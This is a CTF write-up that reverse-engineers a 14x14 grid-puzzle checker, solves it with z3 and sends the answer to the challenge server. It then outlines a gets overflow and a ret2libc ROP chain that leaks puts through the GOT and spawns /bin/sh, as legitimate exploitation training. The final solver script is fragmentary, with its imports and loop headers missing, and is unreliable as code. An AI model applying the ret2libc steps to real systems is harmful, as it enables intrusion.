## Description
Recently, I have started to play CTF. When doing big reverse engineering work, especially where parts may contain many arithmetic operations like when creating KeyGen, I believe that z3 is a really useful with the analysis. And since this is my first time trying out the Z3 Theorem Prover, I think it would be nice to note that down as part of my journey!

In this post, I will deal mostly with the reversing and z3, but will not go too much into details about the pwning part since its a typical `gets` and ret2libc type challenge with a relatively old libc version. Also, I will go through the decompiled code with my renamed variable names which I hope is accurate.

## Let's Begin ( EZPZ-REV )

When trying out the application, there were no outputs and was expected to put in any values. So, for short and incorrect values, we get the string "Incorrect!" and when we input long string, we get Segmentation Fault. 

![[Pasted image 20241111175406.png]]

*Testing inputs*

After some reverse engineering and reformatting, we observe that there are 4 conditions that we need to meet before the flag is read and printed out. 

![[Pasted image 20241111175410.png]]

One thing to note, the result from of the long string that was passed into the function can be treated as a hardcoded value via reading the value dynamically.

## Condition 1

![[Pasted image 20241111175414.png]]

In the first condition, it accepts the puzzle input as a 1D array which is calculated as a 2D array. It checks every row ( in steps of 14 ). For each row, it will see if the puzzle cell contains the value '1'. Finally, number of value '1's must be 3.

Now, we can start the script for the first condition. We first create the `Solver` object added the constraints of value being 1 and 0. Also, the puzzle cells values should be followed and therefore, the list comprehension is there to indicate to the solver the puzzle cells are the value we are trying to solve. At the end of writing the condition, we add another constraint that the number of ones should be 3. The reason that we can add puzzle cell directly is because of the first constraint of values being integer 1 or integer 0.

![[Pasted image 20241111175421.png]]

## Condition 2 

![[Pasted image 20241111175427.png]]

This function is highly similar in construct as condition 1. Instead, it will loop through each column cell to check of the number of value '1's. Again, we see that if the number of '1's is not three, then it will fail.


Very similar to the previous condition, this is the script that helped satisfy the second condition.

![[Pasted image 20241111175434.png]]


## Condition 3

![[Pasted image 20241111175437.png]]

This condition is the only one that deals with the decoded string. This decoded string has length of 196. It's value is used to map `idx` of the `result_store[idx]`. Ultimately, the each values in the result_store should contain the number 3.

The mapping is basically :

```
'a'  ==  'a'-'a'  == 0
'b'  ==  'b'-'a'  == 1
'c'  ==  'c'-'a'  == 2
...
...
'n'  ==  'n'-'a'  == 14
```

To update the result_store entries :
```
    For each cell in the puzzle, 
        if the value is '1'
            add one to the `result_store[idx]`
```

To check for correctness :
```
    For i in result_store:
        i == 3 
```

With that, we can convert these into a script. After understanding the condition, we have to reverse this into a function and add the constraints.

![[Pasted image 20241111175503.png]]

## Condition 4 (Last condition)
Since I could not contain the decompiled code into one screenshot, I have dumped it here instead.

```c
__int64 __fastcall check_no_adjacent_ones_sub_4013B2(char *decoded, char *input_buffer)
{
  char *input; // rdi
  int start_index; // er8
  __int64 v4; // rbx
  unsigned __int64 v5; // r10
  unsigned int indexed_cell; // edx
  int *index; // rcx
  int index_; // edx
  unsigned __int64 v9; // r10
  __int64 column_idx; // rax
  int index_array[8]; // [rsp+0h] [rbp-30h] BYREF
  __int64 v13; // [rsp+20h] [rbp-10h] BYREF

  input = input_buffer;
  start_index = 0;
  v4 = 0x10004001LL;
  while ( 2 )                                   // for each column in a row
  {
    for ( column_idx = 0LL; column_idx != 14; ++column_idx )
    {
      if ( input[column_idx] == '1' )           // if input_buffer value is 1
      {
        index_array[0] = -1;
        index_array[1] = -15;
        index_array[2] = -14;
        index_array[3] = -13;
        index_array[4] = 1;
        index_array[5] = 15;
        index_array[6] = 14;
        index_array[7] = 13;
        for ( index = index_array; &v13 != (__int64 *)index; ++index )// for each of the specified numbers
        {
          index_ = *index;
          if ( (_DWORD)column_idx )             // if not the first column of any row
          {
            if ( (_DWORD)column_idx == 13 )     // last entry in the row ( edge )
            {
              v9 = (unsigned int)(index_ + 13);
              if ( (unsigned int)v9 <= 0x1C )
              {
                if ( _bittest64(&v4, v9) )      // test if it falls on  position 0, 14 or 28
                  continue;
              }
            }
          }
          else                                  // if first column of any row
          {
            v5 = (unsigned int)(index_ + 15);
            if ( (unsigned int)v5 <= 0x1C && _bittest64(&v4, v5) )
              continue;
          }
          indexed_cell = start_index + column_idx + index_;
          // Within range and not 1
          // this means that we are looking to see that there are no adjacent cell
          // containing the value 1 if the current cell is holding the value of 1
          if ( indexed_cell <= 0xC3 && input_buffer[indexed_cell] == '1' )
            return 0LL;
        }
      }
    }
    start_index += 14;                          // go next row
    input += 14;
    if ( input != input_buffer + 196 )          // check end of puzzle
      continue;
    break;
  }
  return 1LL;
}
```

The index_array values are values used in calculation to see if the current cell that was processed is at the boundaries of the puzzle. This is important because the program is checking if the adjacent cells contains the value '1' if current cell itself is containing the value '1'.

```
000             000             100
010             011             000 
000             000             001

PASS            FAIL            PASS
```

Also, we see the _bittest64 instruction was used in the assembly to check against the hex value 0x10004001. That is fancy way of checking if the value is either 0, 14 or 28.
Now, if no value '1's are adjacent to each other in all eight directions, then we pass this condition.

To represent this in the script, I have googled on how to [find all adjacent elements of given element in a 2d array or matrix](https://www.geeksforgeeks.org/find-all-adjacent-elements-of-given-element-in-a-2d-array-or-matrix/) and I ended up adapting it into the script. I have also inlined the `isValidPos` from the post to fit the condition into one function.

![[Pasted image 20241111175516.png]]

At this point, we have all we need to make sure that the conditions are correct. To confirm that this is doable, we have to check for satisfiability and print out the evaluated puzzle cell values. The script will look like this.

# check that each row and column has just three '1's each 

puzzle= [Int('puzzle_%s'%(i)) for i in range(14*14)]
# make sure all value sin the puzzle are either 0 or 1

        if chr(ord('a') + store_idx) == decoded_value[i]: 
            count += puzzle[i]  # due to constraint, we can just add the cell value (0 or 1)

for i in range(14):

        left = [-1,-1,-1,0,0,1,1,1]
        right = [-1,0,1,-1,1,-1,0,1]
        count = 0
        for k in range(len(left)):
            if not ((i+left[k]) < 0 or 
                    (j+right[k])< 0 or 
                    (i+left[k]) > (14 - 1) or 
                    (j+right[k]) > (14 - 1)): # if valid adjacent cell is present
                count += puzzle[(i+left[k])*14+(j+right[k])] 

        # the muliplying i believe forces the relation with puzzle cells in z3 or anything goes
        s.add((count*puzzle[i*14+j]) == 0) 


password = ""
if s.check() == sat:
    m = s.model()
    answer = [m.evaluate(puzzle[i]) for i in range(14*14)]
    
    for i in answer:
        password+= str(i)
    print("")
    print(password)

else:
    print("Problem is unsatisfiable :(")
    pass

print("end program")

p = remote("2022.ductf.dev",30005)
p.recvrepeat(1)
p.sendline(password.encode())
p.interactive()
```

Running this will get us the flag if all goes well.

# Now to the PWN

So where is the bug? Well, you probably have already noticed that it uses the vulnerable function `gets` which allows us to write any buffer length of data into the stack buffer. The only reason we cannot start the pwn challenge immediately is because we do want to exit the program. We need it to get the flag for ezpz-rev and eventually reach the `ret` instruction of this function.

![[Pasted image 20241111175541.png]]

Now that we know the puzzle input to get the flag, we can reach the ret statement after inputting more than 232 characters before do any changes to the instruction pointer. Before continuing, we also know that no canaries is there to block the overflow attempt, no pie is there to mess up the instruction address of the binary and that NX is enabled. This suggest that we can use ROP chain to ret2libc. It is also convenient that the libc used on the server was provided as well.

## Exploit Step and Script

First Stage:
0. Puzzle cells + padding to 232
1. Pop GOT of puts to rdi
2. ret to puts PLT to leak libc of puts  --> puts(puts@GOT)
3. ret the main function  --> restart program 

Calculate the `libc` address based on the offset from the `libc` file and calculate the address of "`/bin/sh`" and system

Second Stage:
0. Puzzle cells + padding to 232
1. pop address of "`/bin/sh`" into rdi
2. ret gadget (to appease MOVAPS in `do_system`)
3. ret to system PLT  --> system("`/bin/sh`")

# Conclusion

I have learnt a lot from and will probably not hesitate (as much) to try z3, I hope ... Also, since this is not really a detailed guide to z3, I recommend reading this really tutorial guide from https://ericpony.github.io/z3py-tutorial/guide-examples.htm. It has a lot more information that I did not really use but it really is beginner friendly!
